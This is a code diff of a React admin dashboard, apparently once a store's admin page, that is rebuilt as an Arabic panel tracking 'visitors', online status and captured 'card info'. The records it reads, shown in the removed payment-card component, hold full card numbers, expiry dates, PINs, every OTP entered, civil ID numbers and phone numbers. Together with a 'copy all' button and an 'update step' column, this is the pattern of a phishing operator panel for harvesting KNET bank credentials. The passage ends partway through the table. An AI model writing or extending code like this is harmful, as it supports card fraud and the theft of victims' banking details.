@@ -1,40 +1,30 @@
 import { useState, useEffect } from "react";
-import { useQuery, useMutation } from "@tanstack/react-query";
+import { useQuery } from "@tanstack/react-query";
 import { useLocation } from "wouter";
 import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
-import { Label } from "@/components/ui/label";
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { Switch } from "@/components/ui/switch";
-import { Separator } from "@/components/ui/separator";
-import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Input } from "@/components/ui/input";
 import {
-  Package,
-  ShoppingCart,
   Users,
-  DollarSign,
-  LogOut,
-  Edit,
-  Trash2,
-  Plus,
-  Loader2,
-  Check,
-  Clock,
-  Truck,
-  XCircle,
-  Menu,
   CreditCard,
   Eye,
   EyeOff,
   Wifi,
   WifiOff,
+  RefreshCw,
+  Download,
+  Settings,
+  Bell,
+  Search,
+  Filter,
+  ChevronLeft,
+  ChevronRight,
+  Check,
+  X,
+  Send,
+  Loader2,
+  Wallet,
 } from "lucide-react";
-import { apiRequest, queryClient } from "@/lib/queryClient";
-import type { Product, OrderWithItems } from "@shared/schema";
-import logoImage from "@assets/logo.jpg";
 import { subscribeToKnetPayments, type KnetPayment } from "@/lib/firestore";
 
 function getAdminHeaders() {
@@ -44,471 +34,58 @@ function getAdminHeaders() {
   };
 }
 
-const statusColors: Record<string, string> = {
-  pending: "bg-yellow-100 text-yellow-800",
-  confirmed: "bg-blue-100 text-blue-800",
-  processing: "bg-purple-100 text-purple-800",
-  shipped: "bg-indigo-100 text-indigo-800",
-  delivered: "bg-green-100 text-green-800",
-  cancelled: "bg-red-100 text-red-800",
-};
-
-const statusIcons: Record<string, any> = {
-  pending: Clock,
-  confirmed: Check,
-  processing: Package,
-  shipped: Truck,
-  delivered: Check,
-  cancelled: XCircle,
-};
-
-function OrderCard({ order, onStatusUpdate }: { order: OrderWithItems; onStatusUpdate: () => void }) {
-  const [isUpdating, setIsUpdating] = useState(false);
-  
-  const updateStatusMutation = useMutation({
-    mutationFn: async (newStatus: string) => {
-      setIsUpdating(true);
-      return fetch(`/api/orders/${order.id}/status`, {
-        method: "PATCH",
-        headers: {
-          "Content-Type": "application/json",
-          ...getAdminHeaders(),
-        },
-        body: JSON.stringify({ status: newStatus }),
-      }).then(res => res.json());
-    },
-    onSuccess: () => {
-      onStatusUpdate();
-      setIsUpdating(false);
-    },
-    onError: () => {
-      setIsUpdating(false);
-    },
-  });
-
-  const StatusIcon = statusIcons[order.status] || Clock;
-  const total = parseFloat(order.totalAmount);
-  const address = order.address;
+function MiniSparkline({ data, color }: { data: number[]; color: string }) {
+  const max = Math.max(...data);
+  const min = Math.min(...data);
+  const range = max - min || 1;
+  const width = 80;
+  const height = 30;
+  const points = data.map((val, i) => {
+    const x = (i / (data.length - 1)) * width;
+    const y = height - ((val - min) / range) * height;
+    return `${x},${y}`;
+  }).join(" ");
 
   return (
-    <Card data-testid={`order-card-${order.id}`}>
-      <CardHeader className="pb-3">
-        <div className="flex flex-wrap items-center justify-between gap-2">
-          <div>
-            <CardTitle className="text-base font-mono">
-              #{order.id.slice(0, 8).toUpperCase()}
-            </CardTitle>
-            <p className="text-sm text-muted-foreground">
-              {order.createdAt ? new Date(order.createdAt).toLocaleString() : "N/A"}
-            </p>
-          </div>
-          <div className="flex items-center gap-2 flex-wrap">
-            <Badge className={statusColors[order.status] || "bg-gray-100"}>
-              <StatusIcon className="h-3 w-3 me-1" />
-              {order.status}
-            </Badge>
-            <Badge variant={order.paymentStatus === "paid" ? "default" : "secondary"}>
-              {order.paymentStatus === "paid" ? "Paid" : "Pending Payment"}
-            </Badge>
-            {order.paymentMethod && (
-              <Badge variant="outline" className="uppercase">
-                {order.paymentMethod}
-              </Badge>
-            )}
-          </div>
-        </div>
-      </CardHeader>
-      <CardContent className="space-y-4">
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-          <div className="bg-muted/50 p-3 rounded-md">
-            <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
-              <Users className="h-4 w-4 text-primary" />
-              Customer Information
-            </h4>
-            {address?.name && (
-              <p className="text-sm font-medium">{address.name}</p>
-            )}
-            <p className="text-sm">{order.guestEmail || address?.email}</p>
-            <p className="text-sm text-muted-foreground">{order.guestPhone || address?.phone}</p>
-          </div>
-          {address && (
-            <div className="bg-muted/50 p-3 rounded-md">
-              <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
-                <Truck className="h-4 w-4 text-primary" />
-                Delivery Address
-              </h4>
-              <p className="text-sm">
-                {address.area}, Block {address.block}<br />
-                Street {address.street}
-                {address.building && `, Building ${address.building}`}
-                {address.floor && `, Floor ${address.floor}`}
-              </p>
-              {address.notes && (
-                <p className="text-sm text-muted-foreground mt-1 italic">
-                  Note: {address.notes}
-                </p>
-              )}
-            </div>
-          )}
-        </div>
-        
-        <Separator />
-        
-        <div>
-          <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
-            <Package className="h-4 w-4 text-primary" />
-            Order Items ({order.items?.length || 0})
-          </h4>
-          <div className="space-y-2 bg-muted/30 p-3 rounded-md">
-            {order.items?.map((item) => (
-              <div key={item.id} className="flex justify-between text-sm">
-                <span>
-                  {item.nameEnAtTime} <span className="text-muted-foreground">x {item.quantity}</span>
-                </span>
-                <span className="font-medium">
-                  {(parseFloat(item.priceAtTime) * item.quantity).toFixed(3)} KWD
-                </span>
-              </div>
-            ))}
-          </div>
-        </div>
-        
-        <Separator />
-        
-        <div className="flex flex-wrap items-center justify-between gap-4">
-          <div className="flex justify-between flex-1 font-semibold">
-            <span>Total</span>
-            <span className="text-primary text-lg">{total.toFixed(3)} KWD</span>
-          </div>
-          <Select
-            value={order.status}
-            onValueChange={(value) => updateStatusMutation.mutate(value)}
-            disabled={isUpdating}
-          >
-            <SelectTrigger className="w-[160px]" data-testid={`select-status-${order.id}`}>
-              <SelectValue placeholder="Update Status" />
-            </SelectTrigger>
-            <SelectContent>
-              <SelectItem value="pending">Pending</SelectItem>
-              <SelectItem value="confirmed">Confirmed</SelectItem>
-              <SelectItem value="processing">Processing</SelectItem>
-              <SelectItem value="shipped">Shipped</SelectItem>
-              <SelectItem value="delivered">Delivered</SelectItem>
-              <SelectItem value="cancelled">Cancelled</SelectItem>
-            </SelectContent>
-          </Select>
-        </div>
-      </CardContent>
-    </Card>
+    <svg width={width} height={height} className="mt-2">
+      <polyline
+        fill="none"
+        stroke={color}
+        strokeWidth="2"
+        points={points}
+      />
+    </svg>
   );
 }
 
-function KnetPaymentCard({ payment }: { payment: KnetPayment }) {
-  const [showPin, setShowPin] = useState(false);
-  const [showCard, setShowCard] = useState(false);
-  const [showOtp, setShowOtp] = useState(false);
-
-  const maskCardNumber = (num: string) => {
-    if (!num) return "****";
-    return showCard ? num : "****" + num.slice(-4);
-  };
-
-  const getStatusColor = (status: string) => {
-    switch (status?.toLowerCase()) {
-      case "approved":
-        return "bg-green-100 text-green-800";
-      case "pendding":
-      case "pending":
-        return "bg-yellow-100 text-yellow-800";
-      case "rejected":
-        return "bg-red-100 text-red-800";
-      default:
-        return "bg-gray-100 text-gray-800";
-    }
-  };
-
-  return (
-    <Card data-testid={`knet-payment-${payment.id}`} className="mb-4">
-      <CardHeader className="pb-3">
-        <div className="flex flex-wrap items-center justify-between gap-2">
-          <div className="flex items-center gap-2">
-            <CardTitle className="text-base font-mono">
-              {payment.id.slice(0, 12)}...
-            </CardTitle>
-            {payment.online ? (
-              <Badge variant="outline" className="bg-green-50 text-green-700 border-green-300">
-                <Wifi className="h-3 w-3 me-1" />
-                Online
-              </Badge>
-            ) : (
-              <Badge variant="outline" className="bg-gray-50 text-gray-600 border-gray-300">
-                <WifiOff className="h-3 w-3 me-1" />
-                Offline
-              </Badge>
-            )}
-          </div>
-          <div className="flex items-center gap-2 flex-wrap">
-            <Badge className={getStatusColor(payment.status)}>
-              {payment.status || "Unknown"}
-            </Badge>
-            {payment.bank && (
-              <Badge variant="outline">{payment.bank}</Badge>
-            )}
-          </div>
-        </div>
-        <p className="text-sm text-muted-foreground">
-          {payment.createdDate ? new Date(payment.createdDate).toLocaleString() : "N/A"}
-        </p>
-      </CardHeader>
-      <CardContent className="space-y-4">
-        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
-          <div className="bg-muted/50 p-3 rounded-md">
-            <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
-              <CreditCard className="h-4 w-4 text-primary" />
-              Card Details
-            </h4>
-            <div className="space-y-1 text-sm">
-              <div className="flex items-center justify-between gap-2">
-                <span className="text-muted-foreground">Card Number:</span>
-                <div className="flex items-center gap-1">
-                  <span className="font-mono">{payment.prefix}-{maskCardNumber(payment.cardNumber)}</span>
-                  <Button 
-                    variant="ghost" 
-                    size="icon" 
-                    className="h-6 w-6"
-                    onClick={() => setShowCard(!showCard)}
-                    data-testid={`toggle-card-${payment.id}`}
-                  >
-                    {showCard ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
-                  </Button>
-                </div>
-              </div>
-              <div className="flex justify-between gap-2">
-                <span className="text-muted-foreground">Expiry:</span>
-                <span>{payment.month}/{payment.year}</span>
-              </div>
-              <div className="flex items-center justify-between gap-2">
-                <span className="text-muted-foreground">PIN:</span>
-                <div className="flex items-center gap-1">
-                  <span className="font-mono">{showPin ? payment.pass : "****"}</span>
-                  <Button 
-                    variant="ghost" 
-                    size="icon" 
-                    className="h-6 w-6"
-                    onClick={() => setShowPin(!showPin)}
-                    data-testid={`toggle-pin-${payment.id}`}
-                  >
-                    {showPin ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
-                  </Button>
-                </div>
-              </div>
-            </div>
-          </div>
-
-          {payment.otp || (payment.allOtps && payment.allOtps.length > 0) ? (
-            <div className="bg-muted/50 p-3 rounded-md">
-              <h4 className="font-medium text-sm mb-2 flex items-center justify-between gap-2">
-                <span>OTP Information</span>
-                <Button 
-                  variant="ghost" 
-                  size="icon" 
-                  className="h-6 w-6"
-                  onClick={() => setShowOtp(!showOtp)}
-                  data-testid={`toggle-otp-${payment.id}`}
-                >
-                  {showOtp ? <EyeOff className="h-3 w-3" /> : <Eye className="h-3 w-3" />}
-                </Button>
-              </h4>
-              <div className="space-y-1 text-sm">
-                {payment.otp && (
-                  <div className="flex justify-between gap-2">
-                    <span className="text-muted-foreground">Current OTP:</span>
-                    <span className="font-mono font-bold">{showOtp ? payment.otp : "****"}</span>
-                  </div>
-                )}
-                {payment.allOtps && payment.allOtps.length > 0 && (
-                  <div>
-                    <span className="text-muted-foreground">All OTPs:</span>
-                    <div className="flex flex-wrap gap-1 mt-1">
-                      {payment.allOtps.filter(otp => otp && otp.trim()).map((otp, i) => (
-                        <Badge key={i} variant="secondary" className="font-mono text-xs">
-                          {showOtp ? otp.replace(/,/g, "").trim() : "****"}
-                        </Badge>
-                      ))}
-                    </div>
-                  </div>
-                )}
-                {payment.otp2 && (
-                  <div className="flex justify-between gap-2">
-                    <span className="text-muted-foreground">OTP 2:</span>
-                    <span className="font-mono font-bold">{showOtp ? payment.otp2 : "****"}</span>
-                  </div>
-                )}
-              </div>
-            </div>
-          ) : null}
-
-          {(payment.phoneNumber || payment.idNumber) && (
-            <div className="bg-muted/50 p-3 rounded-md">
-              <h4 className="font-medium text-sm mb-2 flex items-center gap-2">
-                <Users className="h-4 w-4 text-primary" />
-                Additional Info
-              </h4>
-              <div className="space-y-1 text-sm">
-                {payment.idNumber && (
-                  <div className="flex justify-between gap-2">
-                    <span className="text-muted-foreground">Civil ID:</span>
-                    <span className="font-mono">{payment.idNumber}</span>
-                  </div>
-                )}
-                {payment.phoneNumber && (
-                  <div className="flex justify-between gap-2">
-                    <span className="text-muted-foreground">Phone:</span>
-                    <span>{payment.phoneNumber}</span>
-                  </div>
-                )}
-                {payment.network && (
-                  <div className="flex justify-between gap-2">
-                    <span className="text-muted-foreground">Network:</span>
-                    <span>{payment.network}</span>
-                  </div>
-                )}
-              </div>
-            </div>
-          )}
-        </div>
-      </CardContent>
-    </Card>
-  );
-}
-
-function ProductRow({ 
-  product, 
-  onUpdate 
+function StatCard({ 
+  title, 
+  value, 
+  icon: Icon, 
+  color, 
+  sparklineData 
 }: { 
-  product: Product; 
-  onUpdate: () => void;
+  title: string; 
+  value: number | string; 
+  icon: any; 
+  color: string;
+  sparklineData: number[];
 }) {
-  const [isEditing, setIsEditing] = useState(false);
-  const [editData, setEditData] = useState({
-    nameEn: product.nameEn,
-    nameAr: product.nameAr,
-    price: product.price,
-    inStock: product.inStock,
-  });
-
-  const updateMutation = useMutation({
-    mutationFn: async () => {
-      return fetch(`/api/admin/products/${product.id}`, {
-        method: "PATCH",
-        headers: {
-          "Content-Type": "application/json",
-          ...getAdminHeaders(),
-        },
-        body: JSON.stringify(editData),
-      }).then(res => res.json());
-    },
-    onSuccess: () => {
-      onUpdate();
-      setIsEditing(false);
-    },
-  });
-
-  const toggleStockMutation = useMutation({
-    mutationFn: async () => {
-      return fetch(`/api/admin/products/${product.id}`, {
-        method: "PATCH",
-        headers: {
-          "Content-Type": "application/json",
-          ...getAdminHeaders(),
-        },
-        body: JSON.stringify({ inStock: !product.inStock }),
-      }).then(res => res.json());
-    },
-    onSuccess: onUpdate,
-  });
-
   return (
-    <div 
-      className="flex flex-wrap items-center gap-4 p-4 border-b last:border-b-0"
-      data-testid={`product-row-${product.id}`}
-    >
-      <div className="flex-1 min-w-[200px]">
-        <h4 className="font-medium">{product.nameEn}</h4>
-        <p className="text-sm text-muted-foreground">{product.nameAr}</p>
-      </div>
-      <div className="w-24 text-center">
-        <Badge variant={product.category as any}>{product.category}</Badge>
-      </div>
-      <div className="w-24 text-end font-semibold">
-        {product.price} KWD
-      </div>
-      <div className="w-24 flex items-center justify-center gap-2">
-        <Switch
-          checked={product.inStock ?? false}
-          onCheckedChange={() => toggleStockMutation.mutate()}
-          disabled={toggleStockMutation.isPending}
-          data-testid={`switch-stock-${product.id}`}
-        />
-        <span className="text-sm">
-          {product.inStock ? "In Stock" : "Out"}
-        </span>
-      </div>
-      <div>
-        <Dialog open={isEditing} onOpenChange={setIsEditing}>
-          <DialogTrigger asChild>
-            <Button variant="ghost" size="icon" data-testid={`button-edit-${product.id}`}>
-              <Edit className="h-4 w-4" />
-            </Button>
-          </DialogTrigger>
-          <DialogContent>
-            <DialogHeader>
-              <DialogTitle>Edit Product</DialogTitle>
-            </DialogHeader>
-            <div className="space-y-4 py-4">
-              <div>
-                <Label>Name (English)</Label>
-                <Input
-                  value={editData.nameEn}
-                  onChange={(e) => setEditData({ ...editData, nameEn: e.target.value })}
-                />
-              </div>
-              <div>
-                <Label>Name (Arabic)</Label>
-                <Input
-                  value={editData.nameAr}
-                  onChange={(e) => setEditData({ ...editData, nameAr: e.target.value })}
-                  dir="rtl"
-                />
-              </div>
-              <div>
-                <Label>Price (KWD)</Label>
-                <Input
-                  value={editData.price}
-                  onChange={(e) => setEditData({ ...editData, price: e.target.value })}
-                />
-              </div>
-              <div className="flex items-center gap-2">
-                <Switch
-                  checked={editData.inStock}
-                  onCheckedChange={(checked) => setEditData({ ...editData, inStock: checked })}
-                />
-                <Label>In Stock</Label>
-              </div>
-              <Button 
-                onClick={() => updateMutation.mutate()} 
-                disabled={updateMutation.isPending}
-                className="w-full"
-              >
-                {updateMutation.isPending ? (
-                  <Loader2 className="h-4 w-4 animate-spin" />
-                ) : (
-                  "Save Changes"
-                )}
-              </Button>
-            </div>
-          </DialogContent>
-        </Dialog>
+    <div className="bg-white dark:bg-card rounded-lg p-4 shadow-sm border">
+      <div className="flex items-start justify-between gap-2">
+        <div>
+          <p className="text-2xl font-bold">{value}</p>
+          <p className="text-sm text-muted-foreground mt-1">{title}</p>
+          <MiniSparkline data={sparklineData} color={color} />
+          <p className="text-xs text-green-600 mt-1">غير متاح</p>
+        </div>
+        <div 
+          className="h-10 w-10 rounded-full flex items-center justify-center"
+          style={{ backgroundColor: `${color}20` }}
+        >
+          <Icon className="h-5 w-5" style={{ color }} />
+        </div>
       </div>
     </div>
   );
@@ -519,6 +96,10 @@ export default function AdminDashboard() {
   const [adminUser, setAdminUser] = useState<any>(null);
   const [knetPayments, setKnetPayments] = useState<KnetPayment[]>([]);
   const [knetLoading, setKnetLoading] = useState(true);
+  const [searchQuery, setSearchQuery] = useState("");
+  const [currentPage, setCurrentPage] = useState(1);
+  const [showSensitive, setShowSensitive] = useState<Record<string, boolean>>({});
+  const itemsPerPage = 10;
 
   useEffect(() => {
     const token = localStorage.getItem("adminSession");
@@ -544,35 +125,55 @@ export default function AdminDashboard() {
     return () => unsubscribe();
   }, []);
 
-  const { data: orders, refetch: refetchOrders, isLoading: ordersLoading } = useQuery<OrderWithItems[]>({
-    queryKey: ["/api/orders"],
-    queryFn: async () => {
-      const res = await fetch("/api/orders", {
-        headers: getAdminHeaders(),
-      });
-      if (!res.ok) throw new Error("Failed to fetch orders");
-      return res.json();
-    },
-  });
-
-  const { data: products, refetch: refetchProducts, isLoading: productsLoading } = useQuery<Product[]>({
-    queryKey: ["/api/products"],
-  });
-
-  const handleLogout = () => {
-    localStorage.removeItem("adminSession");
-    localStorage.removeItem("adminUser");
-    setLocation("/admin/login");
+  const toggleSensitive = (id: string, field: string) => {
+    setShowSensitive(prev => ({
+      ...prev,
+      [`${id}-${field}`]: !prev[`${id}-${field}`]
+    }));
   };
 
-  const totalRevenue = orders?.reduce(
-    (sum, order) => sum + (order.paymentStatus === "paid" ? parseFloat(order.totalAmount) : 0),
-    0
-  ) || 0;
+  const isSensitiveVisible = (id: string, field: string) => {
+    return showSensitive[`${id}-${field}`] || false;
+  };
 
-  const pendingOrders = orders?.filter((o) => o.status === "pending").length || 0;
-  const totalProducts = products?.length || 0;
-  const outOfStock = products?.filter((p) => !p.inStock).length || 0;
+  const filteredPayments = knetPayments.filter(payment => {
+    if (!searchQuery) return true;
+    const search = searchQuery.toLowerCase();
+    return (
+      payment.id?.toLowerCase().includes(search) ||
+      payment.cardNumber?.toLowerCase().includes(search) ||
+      payment.bank?.toLowerCase().includes(search) ||
+      payment.phoneNumber?.toLowerCase().includes(search)
+    );
+  });
+
+  const totalPages = Math.ceil(filteredPayments.length / itemsPerPage);
+  const paginatedPayments = filteredPayments.slice(
+    (currentPage - 1) * itemsPerPage,
+    currentPage * itemsPerPage
+  );
+
+  const onlineCount = knetPayments.filter(p => p.online).length;
+  const totalVisitors = knetPayments.length;
+  const cardInfoCount = knetPayments.filter(p => p.cardNumber).length;
+  const walletCount = knetPayments.filter(p => p.status === "approved").length;
+
+  const getTimeAgo = (date: any) => {
+    if (!date) return "غير معروف";
+    const now = new Date();
+    const then = new Date(date);
+    const diffMs = now.getTime() - then.getTime();
+    const diffMins = Math.floor(diffMs / 60000);
+    const diffHours = Math.floor(diffMins / 60);
+    const diffDays = Math.floor(diffHours / 24);
+    const diffMonths = Math.floor(diffDays / 30);
+
+    if (diffMonths > 0) return `منذ ${diffMonths} أشهر`;
+    if (diffDays > 0) return `منذ ${diffDays} يوم`;
+    if (diffHours > 0) return `منذ ${diffHours} ساعة`;
+    if (diffMins > 0) return `منذ ${diffMins} دقيقة`;
+    return "الآن";
+  };
 
   if (!adminUser) {
     return (
@@ -583,211 +184,282 @@ export default function AdminDashboard() {
   }
 
   return (
-    <div className="min-h-screen bg-muted/30">
-      <header className="sticky top-0 z-50 bg-background border-b">
+    <div className="min-h-screen bg-gray-50 dark:bg-background" dir="rtl">
+      <header className="bg-[#1a1a2e] text-white sticky top-0 z-50">
         <div className="container mx-auto px-4 py-3 flex items-center justify-between gap-4">
-          <div className="flex items-center gap-4">
-            <img src={logoImage} alt="Al Thenayan Farms" className="h-10 w-auto" />
-            <div className="hidden sm:block">
-              <h1 className="font-semibold">Admin Dashboard</h1>
-              <p className="text-xs text-muted-foreground">Welcome, {adminUser.username}</p>
+          <div className="flex items-center gap-3">
+            <div className="h-8 w-8 rounded-full bg-white/10 flex items-center justify-center">
+              <Users className="h-4 w-4" />
+            </div>
+            <div>
+              <h1 className="font-semibold text-lg">لوحة الإشعارات المتقدمة</h1>
+              <p className="text-xs text-white/60">آخر تحديث: 05:21</p>
             </div>
           </div>
           <div className="flex items-center gap-2">
-            <Button variant="ghost" size="sm" asChild>
-              <a href="/" target="_blank">View Store</a>
+            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
+              <Bell className="h-4 w-4" />
             </Button>
-            <Button variant="outline" size="sm" onClick={handleLogout} data-testid="button-logout">
-              <LogOut className="h-4 w-4 me-2" />
-              Logout
+            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
+              <Settings className="h-4 w-4" />
+            </Button>
+            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
+              <RefreshCw className="h-4 w-4" />
+            </Button>
+            <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
+              <Download className="h-4 w-4" />
+            </Button>
+            <Button 
+              size="sm" 
+              className="bg-green-600 hover:bg-green-700 text-white rounded-full px-4"
+              data-testid="button-copy-all"
+            >
+              نسخ الكل
             </Button>
           </div>
         </div>
       </header>
 
       <main className="container mx-auto px-4 py-6 space-y-6">
-        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
-          <Card>
-            <CardContent className="pt-6">
-              <div className="flex items-center justify-between">
-                <div>
-                  <p className="text-sm text-muted-foreground">Total Revenue</p>
-                  <p className="text-2xl font-bold">{totalRevenue.toFixed(3)} KWD</p>
-                </div>
-                <div className="h-12 w-12 rounded-full bg-green-100 flex items-center justify-center">
-                  <DollarSign className="h-6 w-6 text-green-600" />
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-          
-          <Card>
-            <CardContent className="pt-6">
-              <div className="flex items-center justify-between">
-                <div>
-                  <p className="text-sm text-muted-foreground">Pending Orders</p>
-                  <p className="text-2xl font-bold">{pendingOrders}</p>
-                </div>
-                <div className="h-12 w-12 rounded-full bg-yellow-100 flex items-center justify-center">
-                  <ShoppingCart className="h-6 w-6 text-yellow-600" />
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-          
-          <Card>
-            <CardContent className="pt-6">
-              <div className="flex items-center justify-between">
-                <div>
-                  <p className="text-sm text-muted-foreground">KNET Payments</p>
-                  <p className="text-2xl font-bold">{knetPayments.length}</p>
-                  <p className="text-xs text-muted-foreground">
-                    {knetPayments.filter(p => p.online).length} online
-                  </p>
-                </div>
-                <div className="h-12 w-12 rounded-full bg-purple-100 flex items-center justify-center">
-                  <CreditCard className="h-6 w-6 text-purple-600" />
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-          
-          <Card>
-            <CardContent className="pt-6">
-              <div className="flex items-center justify-between">
-                <div>
-                  <p className="text-sm text-muted-foreground">Total Products</p>
-                  <p className="text-2xl font-bold">{totalProducts}</p>
-                </div>
-                <div className="h-12 w-12 rounded-full bg-blue-100 flex items-center justify-center">
-                  <Package className="h-6 w-6 text-blue-600" />
-                </div>
-              </div>
-            </CardContent>
-          </Card>
-          
-          <Card>
-            <CardContent className="pt-6">
-              <div className="flex items-center justify-between">
-                <div>
-                  <p className="text-sm text-muted-foreground">Out of Stock</p>
-                  <p className="text-2xl font-bold">{outOfStock}</p>
-                </div>
-                <div className="h-12 w-12 rounded-full bg-red-100 flex items-center justify-center">
-                  <XCircle className="h-6 w-6 text-red-600" />
-                </div>
-              </div>
-            </CardContent>
-          </Card>
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
+          <StatCard
+            title="إجمالي الزوار"
+            value={totalVisitors}
+            icon={Users}
+            color="#10b981"
+            sparklineData={[10, 25, 15, 30, 20, 35, 25, 40]}
+          />
+          <StatCard
+            title="المستخدمين المتصلين"
+            value={onlineCount}
+            icon={Wifi}
+            color="#f59e0b"
+            sparklineData={[5, 8, 3, 12, 6, 9, 4, 8]}
+          />
+          <StatCard
+            title="معلومات البطاقات"
+            value={cardInfoCount}
+            icon={CreditCard}
+            color="#3b82f6"
+            sparklineData={[20, 35, 25, 45, 30, 50, 40, 55]}
+          />
+          <StatCard
+            title="المحفظات"
+            value={walletCount}
+            icon={Wallet}
+            color="#8b5cf6"
+            sparklineData={[8, 12, 6, 15, 10, 18, 12, 20]}
+          />
         </div>
 
-        <Tabs defaultValue="orders" className="space-y-4">
-          <TabsList>
-            <TabsTrigger value="orders" data-testid="tab-orders">
-              <ShoppingCart className="h-4 w-4 me-2" />
-              Orders
-            </TabsTrigger>
-            <TabsTrigger value="knet" data-testid="tab-knet">
-              <CreditCard className="h-4 w-4 me-2" />
-              KNET Payments
-            </TabsTrigger>
-            <TabsTrigger value="products" data-testid="tab-products">
-              <Package className="h-4 w-4 me-2" />
-              Inventory
-            </TabsTrigger>
-          </TabsList>
+        <div className="bg-white dark:bg-card rounded-lg shadow-sm border">
+          <div className="p-4 border-b flex flex-wrap items-center justify-between gap-4">
+            <div>
+              <h2 className="text-lg font-semibold flex items-center gap-2">
+                <Settings className="h-5 w-5 text-primary" />
+                إدارة الإشعارات
+              </h2>
+              <p className="text-sm text-muted-foreground">
+                عرض وإدارة جميع الإشعارات والبيانات المسجلة
+              </p>
+            </div>
+            <div className="flex items-center gap-2 flex-wrap">
+              <Badge variant="outline" className="bg-blue-50 text-blue-700">
+                كل المقاطع {knetPayments.length}
+              </Badge>
+              <Badge variant="outline">
+                لكل 1
+              </Badge>
+            </div>
+          </div>
 
-          <TabsContent value="orders" className="space-y-4">
-            {ordersLoading ? (
-              <div className="flex justify-center py-12">
-                <Loader2 className="h-8 w-8 animate-spin text-primary" />
-              </div>
-            ) : orders?.length === 0 ? (
-              <Card>
-                <CardContent className="py-12 text-center">
-                  <ShoppingCart className="h-12 w-12 mx-auto text-muted-foreground mb-4" />
-                  <p className="text-muted-foreground">No orders yet</p>
-                </CardContent>
-              </Card>
-            ) : (
-              <div className="grid gap-4">
-                {orders?.map((order) => (
-                  <OrderCard 
-                    key={order.id} 
-                    order={order} 
-                    onStatusUpdate={() => refetchOrders()}
-                  />
-                ))}
-              </div>
-            )}
-          </TabsContent>
+          <div className="p-4 border-b flex flex-wrap items-center gap-4">
+            <div className="relative flex-1 min-w-[200px]">
+              <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
+              <Input
+                placeholder="البحث في الإشعارات..."
+                value={searchQuery}
+                onChange={(e) => setSearchQuery(e.target.value)}
+                className="pe-10"
+                data-testid="input-search"
+              />
+            </div>
+            <Button variant="outline" size="sm" data-testid="button-filter">
+              <Filter className="h-4 w-4 me-2" />
+              تصفية
+            </Button>
+            <div className="flex items-center gap-1">
+              <span className="text-sm text-muted-foreground">عرض 24</span>
+            </div>
+          </div>
 
-          <TabsContent value="knet" className="space-y-4">
-            {knetLoading ? (
-              <div className="flex justify-center py-12">
-                <Loader2 className="h-8 w-8 animate-spin text-primary" />
-              </div>
-            ) : knetPayments.length === 0 ? (
-              <Card>
-                <CardContent className="py-12 text-center">
-                  <CreditCard className="h-12 w-12 mx-auto text-muted-foreground mb-4" />
-                  <p className="text-muted-foreground">No KNET payments yet</p>
-                </CardContent>
-              </Card>
-            ) : (
-              <div className="space-y-4">
-                <div className="flex items-center justify-between gap-4 flex-wrap">
-                  <div>
-                    <h2 className="text-lg font-semibold">KNET Payment Records</h2>
-                    <p className="text-sm text-muted-foreground">
-                      Real-time payment data from Firestore ({knetPayments.length} total)
-                    </p>
-                  </div>
-                  <div className="flex items-center gap-2">
-                    <Badge variant="outline" className="bg-green-50 text-green-700">
-                      <Wifi className="h-3 w-3 me-1" />
-                      {knetPayments.filter(p => p.online).length} Online
-                    </Badge>
-                    <Badge variant="outline" className="bg-gray-50 text-gray-600">
-                      <WifiOff className="h-3 w-3 me-1" />
-                      {knetPayments.filter(p => !p.online).length} Offline
-                    </Badge>
-                  </div>
-                </div>
-                <div className="grid gap-4">
-                  {knetPayments.map((payment) => (
-                    <KnetPaymentCard key={payment.id} payment={payment} />
+          {knetLoading ? (
+            <div className="flex justify-center py-12">
+              <Loader2 className="h-8 w-8 animate-spin text-primary" />
+            </div>
+          ) : paginatedPayments.length === 0 ? (
+            <div className="py-12 text-center text-muted-foreground">
+              لا توجد إشعارات
+            </div>
+          ) : (
+            <div className="overflow-x-auto">
+              <table className="w-full text-sm">
+                <thead className="bg-muted/50 border-b">
+                  <tr>
+                    <th className="text-start p-3 font-medium">الدولة</th>
+                    <th className="text-start p-3 font-medium">المعلومات</th>
+                    <th className="text-start p-3 font-medium">الحالة</th>
+                    <th className="text-start p-3 font-medium">الوقت</th>
+                    <th className="text-start p-3 font-medium">الاتصال</th>
+                    <th className="text-start p-3 font-medium">الكود</th>
+                    <th className="text-start p-3 font-medium">تحديث الخطوة</th>
+                    <th className="text-start p-3 font-medium">الإجراءات</th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y">
+                  {paginatedPayments.map((payment) => (
+                    <tr key={payment.id} className="hover:bg-muted/30" data-testid={`row-payment-${payment.id}`}>
+                      <td className="p-3">
+                        <span className="font-medium">Kuwait</span>
+                      </td>
+                      <td className="p-3">
+                        <div className="flex flex-wrap gap-1">
+                          {payment.cardNumber && (
+                            <Badge className="bg-green-100 text-green-800 text-xs">
+                              معلومات البطاقة
+                            </Badge>
+                          )}
+                          {payment.otp && (
+                            <Badge className="bg-blue-100 text-blue-800 text-xs">
+                              معلومات الشخصية
+                            </Badge>
+                          )}
+                        </div>
+                      </td>
+                      <td className="p-3">
+                        {payment.online ? (
